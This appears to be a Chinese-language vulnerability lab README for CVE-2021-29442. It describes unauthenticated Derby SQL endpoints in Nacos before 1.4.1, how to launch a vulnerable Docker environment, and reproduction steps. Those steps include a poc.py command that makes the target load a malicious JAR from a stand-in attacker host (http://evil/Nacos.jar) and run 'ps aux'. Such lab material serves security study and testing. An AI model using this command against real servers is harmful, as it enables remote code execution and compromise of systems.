# Alibaba Nacos 未授权接口命令执行漏洞（CVE-2021-29442）

Nacos 是一个设计用于动态服务发现、配置和服务管理的易于使用的平台。

在Nacos 1.4.1之前的版本中，一些API端点（如`/nacos/v1/cs/ops/derby`）可以默认没有鉴权，可以被未经身份验证的用户公开访问。攻击者可以利用该漏洞执行任意Derby SQL语句和 Java 代码。

参考资料：

- <https://github.com/advisories/GHSA-xv5h-v7jh-p2qh>
- <https://github.com/alibaba/nacos/issues/4463>
- <http://www.lvyyevd.cn/archives/derby-shu-ju-ku-ru-he-shi-xian-rce>

## 漏洞环境

执行如下命令启动一个 Alibaba Nacos 1.4.0服务器：

```
docker compose up -d  
```

服务器启动后，访问`http://your-ip:8848/nacos/`可以看到 Nacos 的默认登录页面。

## 漏洞复现

首先，将恶意JAR包[evil.jar](evil.jar)上传到攻击者的HTTP服务器上，例如`http://evil/Nacos.jar`。

然后，执行[POC](poc.py)：

```
python poc.py -t http://your-ip:8848 -s http://evil/Nacos.jar -c "ps aux"  
```

`-t`参数指定目标地址，`-s`参数指定恶意JAR包的地址，`-c`参数指定要执行的命令。

可见，`ps aux`命令已被成功执行：

![](1.png)
